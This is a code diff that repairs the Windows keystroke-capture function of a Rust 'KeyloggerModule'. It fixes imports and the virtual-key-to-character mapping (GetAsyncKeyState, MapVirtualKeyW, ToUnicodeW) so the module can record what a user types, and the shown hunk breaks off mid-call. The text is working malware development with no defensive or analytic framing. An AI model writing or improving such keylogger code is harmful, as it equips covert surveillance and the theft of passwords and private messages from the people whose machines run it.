@@ -30,24 +30,25 @@ impl KeyloggerModule {
     /// Capture a single key press (platform-specific)
     #[cfg(windows)]
     fn capture_key(&self, key_code: u32) -> Result<Vec<u8>, ModuleError> {
-        use windows::Win32::Foundation;
-        use windows::Win32::UI::WindowsAndMessaging;
+        use windows::Win32::UI::WindowsAndMessaging::{GetAsyncKeyState, GetKeyState, GetKeyboardLayout, ToUnicodeW, MapVirtualKeyW, MAPVK_VK_TO_VSC};
+        use windows::Win32::Foundation::HKL;
 
         let mut state = [0u8; 256];
         unsafe {
             // Get async key state
-            let async_state = WindowsAndMessaging::GetAsyncKeyState(key_code as i32);
+            let async_state = GetAsyncKeyState(key_code as i32);
             // Get key state
-            let key_state = WindowsAndMessaging::GetKeyState(key_code as i32);
+            let _key_state = GetKeyState(key_code as i32);
 
             // Check if key was pressed (high bit set)
             if async_state & 0x8000 != 0 {
                 // Map virtual key to character
                 let mut lpstr = [0u16; 16];
-                let keyboard_layout = WindowsAndMessaging::GetKeyboardLayout(0);
-                let chars = WindowsAndMessaging::ToUnicodeW(
+                let keyboard_layout: HKL = GetKeyboardLayout(0);
+                let scan_code = MapVirtualKeyW(key_code as u32, MAPVK_VK_TO_VSC.0 as u32);
+                let chars = ToUnicodeW(
                     key_code as u32,
-                    Foundation::MapVirtualKeyW(key_code as u32, WindowsAndMessaging::MAPVK_VK_TO_VSC).unwrap_or(0),
+                    scan_code,
                     &state,
                     &mut lpstr,
                     lpstr.len() as i32,
